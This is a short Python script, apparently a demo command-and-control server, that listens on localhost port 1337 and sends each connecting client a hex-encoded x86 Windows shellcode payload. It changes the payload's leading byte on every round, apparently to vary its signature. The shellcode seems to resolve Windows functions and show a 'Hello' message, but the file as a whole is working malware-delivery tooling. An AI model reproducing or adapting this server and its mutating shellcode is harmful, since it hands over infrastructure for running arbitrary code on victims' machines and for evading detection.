import socket
import bitstring

HOST = "127.0.0.1"
PORT = 1337

shellcode = "d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e4661746175f2817e084578697475e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c76853552101686c6f2044682048656c89e1fe490b31c05150ffd700"
beginning = "32"

def mutate_beginning(value: str) -> str:
    number = int(value)
    if number > 32:
        return "32"
    else:
        number = number + 1
        return str(number)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()

    while(True):
        mutated_beginning = mutate_beginning(beginning)
        mutated_shellcode = "{0}{1}".format(mutated_beginning, shellcode)
        c2_command = bytes.fromhex(mutated_shellcode)
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                conn.send(c2_command)
                beginning = mutated_beginning